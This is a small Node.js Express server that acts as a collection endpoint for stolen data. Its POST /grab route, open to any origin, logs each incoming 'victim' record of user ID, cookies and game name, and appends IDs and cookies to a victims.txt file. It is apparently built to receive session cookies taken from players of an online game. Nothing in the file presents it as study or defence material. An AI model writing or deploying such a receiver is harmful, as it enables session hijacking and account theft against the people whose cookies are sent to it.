const express = require('express');
const cors = require('cors'); // Allows cross-origin requests
const app = express();

app.use(cors()); // Allow all origins
app.use(express.json()); // Parse incoming JSON

app.post('/grab', (req, res) => {
    const data = req.body;
    
    console.log("=== NEW VICTIM ===");
    console.log("User ID:", data.userId);
    console.log("Cookies:", data.cookies);
    console.log("Game:", data.gameName);
    
    // Optional: Save to a file
    const fs = require('fs');
    fs.appendFileSync("victims.txt", `ID: ${data.userId} | COOKIES: ${data.cookies}\n`);

    res.status(200).send("Received");
});

app.listen(3000, () => {
    console.log("Server listening on port 3000");
});
